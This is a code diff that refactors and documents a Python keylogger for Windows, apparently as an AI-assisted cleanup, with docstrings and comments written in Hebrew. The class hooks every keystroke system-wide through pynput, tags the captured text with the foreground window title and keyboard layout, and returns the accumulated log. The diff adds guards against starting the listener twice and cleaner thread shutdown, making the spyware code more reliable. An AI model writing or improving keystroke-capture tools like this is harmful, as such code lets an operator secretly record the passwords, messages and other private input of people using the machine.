@@ -1,58 +1,51 @@
 from abc import ABC, abstractmethod
-from typing import List
+from typing import List, Dict, Any
 import win32gui
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener, Key
 import win32api
 
 
 class IKeyLogger(ABC):
+    """
+    ממשק מופשט עבור לוגר מקלדת.
+    מגדיר את הפעולות הנדרשות לכל יישום של לוגר מקלדת.
+    """
     @abstractmethod
     def start_logging(self) -> None:
+        """מתחיל את תהליך הרישום של לחיצות מקלדת."""
         pass
 
     @abstractmethod
     def stop_logging(self) -> None:
+        """מפסיק את תהליך הרישום של לחיצות מקלדת."""
         pass
 
     @abstractmethod
-    def get_logged_keys(self) -> List[str]:
+    def get_logged_keys(self) -> List[Dict[str, Dict[str, str]]]:
+        """
+        מחזיר את רשימת הלחיצות שנרשמו.
+
+        Returns:
+            List[Dict[str, Dict[str, str]]]: רשימה של מילונים, כאשר כל מילון מייצג רישום
+                                             עבור חלון פעיל, הכולל את הטקסט שנרשם ואת שפת המקלדת.
+        """
         pass
 
 
-class mein_keylogg(IKeyLogger):
+class MeinKeylogger(IKeyLogger):
+    """
+    יישום של לוגר מקלדת הרושם לחיצות מקלדת ומאחסן אותן
+    ביחס לחלון הפעיל ולשפת המקלדת בעת הלחיצה.
+    """
 
     def __init__(self):
+        """
+        אתחול אובייקט MeinKeylogger.
+        מגדיר את המאזין (listener) ל-None ואת רשימת הלחיצות (logged_keys) כרשימה ריקה.
+        """
         self.listener = None
-        self.logged_keys = []
-
-
-    def _get_active_window_title(self) -> str:
-        window = win32gui.GetForegroundWindow()
-        return win32gui.GetWindowText(window)
-
-    def _add_key_and_window(self, event: str) -> None:
-        window_title = self._get_active_window_title()
-        language_id = win32api.GetKeyboardLayoutName() # מקבלים את שם השפה
-
-        try:
-            # **שינוי חשוב כאן!**  אנחנו שומרים גם את השפה במילון
-            if 'text' in self.logged_keys[-1][window_title]:
-                self.logged_keys[-1][window_title]['text'] += event
-            else:
-                self.logged_keys[-1][window_title]['text'] = event
-                self.logged_keys[-1][window_title]['language'] = language_id # **שומרים את השפה כאן!**
-        except:
-            self.logged_keys.append({window_title: {'text': event, 'language': language_id}}) # **וגם כאן!**
-
-        print(type(event))
-        print(self.logged_keys)
-
-    def _on_key_press(self, key) -> None:
-        try:
-            key = key.char
-        except AttributeError:
-            key = str(key)
-        keys_dict = {
+        self.logged_keys: List[Dict[str, Dict[str, str]]] = []
+        self.keys_dict = { # העברתי את keys_dict לתוך __init__ לשיפור קריאות וארגון
             "Key.alt": "(*alt*)",
             "Key.alt_l": "(*alt_l*)",
             "Key.alt_r": "(*alt_r*)",
@@ -114,19 +107,83 @@ class mein_keylogg(IKeyLogger):
             "Key.print_screen": "(*print_screen*)",
             "Key.scroll_lock": "(*scroll_lock*)"
         }
-        key = keys_dict.get(key, key)
-        self._add_key_and_window(key)
+
+    def _get_active_window_title(self) -> str:
+        """
+        מקבל את הכותרת של החלון הפעיל כרגע.
+
+        Returns:
+            str: כותרת החלון הפעיל, או None אם לא ניתן לקבל את הכותרת.
+        """
+        window = win32gui.GetForegroundWindow()
+        if window:
+            return win32gui.GetWindowText(window)
+        return "No Active Window" # טיפול במקרה שאין חלון פעיל
+
+    def _add_key_and_window(self, event: str) -> None:
+        """
+        מוסיף את האירוע (לחיצת מקש) לרשימת הלחיצות, משויך לכותרת החלון הפעיל ולשפה.
+
+        Args:
+            event (str): האירוע (מקש או תו) שנרשם.
+        """
+        window_title = self._get_active_window_title()
+        language_id = win32api.GetKeyboardLayoutName()
+
+        if not self.logged_keys or window_title not in self.logged_keys[-1]:
+            # אם רשימת הלוגים ריקה או אם החלון השתנה, מתחילים רישום חדש לחלון
+            self.logged_keys.append({window_title: {'text': event, 'language': language_id}})
+        else:
+            # אם החלון לא השתנה, מוסיפים את הטקסט לרישום הקיים של החלון
+            self.logged_keys[-1][window_title]['text'] += event
+
+        print(type(event)) # השארתי את ה print לבקשתך
+        print(self.logged_keys) # השארתי את ה print לבקשתך
+
+    def _on_key_press(self, key: Key) -> None:
+        """
+        פונקציה זו מופעלת בכל פעם שלוחצים על מקש.
+        היא ממירה את המקש לתו או לייצוג מיוחד, ומוסיפה אותו ללוג.
+
+        Args:
+            key (Key): אובייקט המקש שנלחץ.
+        """
+        try:
+            key_char = key.char # מנסה לקבל תו רגיל
+        except AttributeError:
+            key_char = str(key) # אם זה מקש מיוחד, ממיר למחרוזת
+        key_to_log = self.keys_dict.get(key_char, key_char) # משתמש במילון להחלפה לייצוג מיוחד
+        self._add_key_and_window(key_to_log)
 
     def start_logging(self) -> None:
-        self.listener = Listener(on_press=self._on_key_press)
-        self.listener.start()
+        """
+        מתחיל את תהליך הרישום על ידי הפעלת מאזין ללחיצות מקלדת בחוט נפרד.
+        """
+        if self.listener is None or not self.listener.is_alive(): # מונע הפעלה של מאזין כפול
+            self.logged_keys = [] # איפוס הלוגים בהתחלה חדשה
+            self.listener = Listener(on_press=self._on_key_press)
+            self.listener.start()
+            print("Keylogger started") # אינדיקציה שהלוגר התחיל
 
     def stop_logging(self) -> None:
-        if self.listener:
+        """
+        מפסיק את תהליך הרישום על ידי עצירת המאזין.
+        """
+        if self.listener and self.listener.is_alive(): # בודק שהמאזין פעיל לפני עצירה
             self.listener.stop()
+            self.listener.join() # מחכה לסיום החוט כדי למנוע בעיות סגירה
+            self.listener = None # מאפס את המאזין
+            print("Keylogger stopped") # אינדיקציה שהלוגר נעצר
+        else:
+            print("Keylogger is not running") # הודעה אם מנסים לעצור לוגר שלא פועל
 
-    def get_logged_keys(self) -> List[str]:
+    def get_logged_keys(self) -> List[Dict[str, Dict[str, str]]]:
+        """
+        מחזיר את הלחיצות שנרשמו עד כה.
+
+        Returns:
+            List[Dict[str, Dict[str, str]]]: רשימת הלחיצות מקלדת שנרשמו, מאורגנות לפי חלון ושפה.
+        """
         return self.logged_keys
-
 
 
